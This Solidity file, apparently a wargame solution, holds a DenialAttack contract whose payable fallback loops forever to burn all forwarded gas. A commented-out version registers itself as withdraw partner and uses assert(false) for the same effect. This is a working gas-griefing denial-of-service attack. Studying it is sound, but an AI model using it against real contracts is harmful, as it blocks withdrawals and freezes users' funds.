// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {

    constructor() {

    }

    fallback() payable external {
        while(true) {

        }
    }
}


//import "./Denial.sol";
// contract DenialAttack {
//     Denial DenialContract;
    
//     constructor(address payable DenialContractAddress) public payable {
//         DenialContract = Denial(DenialContractAddress);
//     }

//     function initiateAttack() public {
//         DenialContract.setWithdrawPartner(address(this));
//     }
  
//     fallback() external payable {
//         assert(false); //drian all gas
//     }
// }